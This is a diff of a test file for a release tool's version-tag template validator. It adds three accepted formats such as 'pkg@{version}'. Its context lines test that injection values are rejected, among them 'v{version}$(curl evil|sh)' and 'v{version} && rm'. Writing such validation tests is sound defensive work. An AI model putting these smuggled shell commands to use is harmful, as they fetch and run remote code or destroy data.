@@ -139,6 +139,9 @@ describe('the release tool contract', () => {
     expect(configure('release/{version}')).toBe(true);
     expect(configure('v{version}-final')).toBe(true);
     expect(configure('{version}')).toBe(true);
+    expect(configure('pkg@{version}')).toBe(true);
+    expect(configure('@scope/pkg@{version}')).toBe(true);
+    expect(configure('v{version}+stable')).toBe(true);
     expect(configure('v{version}$(curl evil|sh)')).toBe(false);
     expect(configure('v{version} && rm')).toBe(false);
     expect(configure('-{version}')).toBe(false);
